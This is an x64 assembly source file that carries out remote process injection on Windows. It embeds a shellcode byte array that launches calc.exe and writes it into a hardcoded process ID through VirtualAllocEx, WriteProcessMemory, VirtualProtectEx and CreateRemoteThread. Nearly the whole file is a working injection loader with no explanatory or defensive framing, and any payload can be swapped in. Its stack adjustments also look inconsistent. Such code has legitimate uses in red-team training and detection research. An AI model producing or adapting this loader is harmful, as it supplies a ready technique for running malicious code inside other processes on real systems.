.data

calc_shellcode db 0fcH, 048H, 083H, 0e4H, 0f0H, 0e8H, 0c0H, 000H, 000H, 000H, 041H, 051H, 041H, 050H
               db 052H, 051H, 056H, 048H, 031H, 0d2H, 065H, 048H, 08bH, 052H, 060H, 048H, 08bH, 052H
               db 018H, 048H, 08bH, 052H, 020H, 048H, 08bH, 072H, 050H, 048H, 00fH, 0b7H, 04aH, 04aH
               db 04dH, 031H, 0c9H, 048H, 031H, 0c0H, 0acH, 03cH, 061H, 07cH, 002H, 02cH, 020H, 041H
               db 0c1H, 0c9H, 00dH, 041H, 001H, 0c1H, 0e2H, 0edH, 052H, 041H, 051H, 048H, 08bH, 052H
               db 020H, 08bH, 042H, 03cH, 048H, 001H, 0d0H, 08bH, 080H, 088H, 000H, 000H, 000H, 048H
               db 085H, 0c0H, 074H, 067H, 048H, 001H, 0d0H, 050H, 08bH, 048H, 018H, 044H, 08bH, 040H
               db 020H, 049H, 001H, 0d0H, 0e3H, 056H, 048H, 0ffH, 0c9H, 041H, 08bH, 034H, 088H, 048H
               db 001H, 0d6H, 04dH, 031H, 0c9H, 048H, 031H, 0c0H, 0acH, 041H, 0c1H, 0c9H, 00dH, 041H
               db 001H, 0c1H, 038H, 0e0H, 075H, 0f1H, 04cH, 003H, 04cH, 024H, 008H, 045H, 039H, 0d1H
               db 075H, 0d8H, 058H, 044H, 08bH, 040H, 024H, 049H, 001H, 0d0H, 066H, 041H, 08bH, 00cH
               db 048H, 044H, 08bH, 040H, 01cH, 049H, 001H, 0d0H, 041H, 08bH, 004H, 088H, 048H, 001H
               db 0d0H, 041H, 058H, 041H, 058H, 05eH, 059H, 05aH, 041H, 058H, 041H, 059H, 041H, 05aH
               db 048H, 083H, 0ecH, 020H, 041H, 052H, 0ffH, 0e0H, 058H, 041H, 059H, 05aH, 048H, 08bH
               db 012H, 0e9H, 057H, 0ffH, 0ffH, 0ffH, 05dH, 048H, 0baH, 001H, 000H, 000H, 000H, 000H
               db 000H, 000H, 000H, 048H, 08dH, 08dH, 001H, 001H, 000H, 000H, 041H, 0baH, 031H, 08bH
               db 06fH, 087H, 0ffH, 0d5H, 0bbH, 0f0H, 0b5H, 0a2H, 056H, 041H, 0baH, 0a6H, 095H, 0bdH
               db 09dH, 0ffH, 0d5H, 048H, 083H, 0c4H, 028H, 03cH, 006H, 07cH, 00aH, 080H, 0fbH, 0e0H
               db 075H, 005H, 0bbH, 047H, 013H, 072H, 06fH, 06aH, 000H, 059H, 041H, 089H, 0daH, 0ffH
               db 0d5H, 063H, 061H, 06cH, 063H, 02eH, 065H, 078H, 065H, 000H

calc_shellcode_size EQU $ - calc_shellcode

; Constants used in the Win32 APIs
PROCESS_ALL_ACCESS EQU 0FFFFh 
MEM_COMMIT  EQU 1000h
MEM_RESERVE EQU 2000h
MEM_PROTECTION EQU MEM_COMMIT or MEM_RESERVE
PAGE_EXECUTE_READWRITE EQU 040h
PAGE_READWRITE EQU 04h

REMOTE_PROCESS_ID dd 19712

.code

externdef OpenProcess: proc
externdef VirtualAllocEx: proc
externdef WriteProcessMemory: proc
externdef VirtualProtectEx: proc
externdef CreateRemoteThread: proc
externdef CloseHandle: proc
externdef GetLastError: proc

main proc
   
    sub rsp, 28h 

    xor rax, rax
    ; Get the target process handle
    mov rcx, PROCESS_ALL_ACCESS
    mov rdx, 0
    mov r8d, REMOTE_PROCESS_ID
    call OpenProcess
    test rax, rax
    jz errorBlock

    mov r12, rax ; This will hold the remote process handle

    ; Allocate Memory in the remote process
    mov rcx, rax
    xor rdx, rdx
    mov r8d, calc_shellcode_size
    mov r9, MEM_PROTECTION
    mov dword ptr [rsp+20h], PAGE_READWRITE
    call VirtualAllocEx
    test rax, rax
    jz errorBlock

    mov r13, rax ; This will hold the shellcode address in the remote process

    ; Write the calc shellcode to the remote process
    mov rcx, r12
    mov rdx, r13
    lea r8, calc_shellcode
    mov r9d, calc_shellcode_size
    xor rax, rax
    mov [rsp+20h], rax  ; lpNumberOfBytesWritten
    call WriteProcessMemory
    add rsp, 28h
    test rax, rax
    jz errorBlock

    add rsp, 28h

    ; Change the protection of the allocated virtual memory in the remote process
    mov rcx, r12
    mov rdx, r13
    mov r8d, calc_shellcode_size
    mov r9, PAGE_EXECUTE_READWRITE
    lea rax, [rsp+30h]
    mov [rsp+20h], rax 
    call VirtualProtectEx
    test rax, rax
    jz errorBlock

    ; Create remote thread to start the calc shellcode in the remote process
    sub rsp, 20h   
    mov rcx, r12
    xor rdx, rdx
    xor r8, r8
    mov r9, r13
    mov qword ptr [rsp+20h], 0
    mov qword ptr [rsp+28h], 0 
    mov qword ptr [rsp+30h], 0
    call CreateRemoteThread
    add rsp, 20h
    test rax, rax
    jz errorBlock

    mov r14, rax ; this will holds the thread handle

    ; Close handles
    mov rcx, r14
    call CloseHandle
    mov rcx, r12
    call CloseHandle
    
    xor rax, rax
    add rsp, 28h
    ret

errorBlock:
    call GetLastError
    add rsp, 28h
	ret 
main endp 

end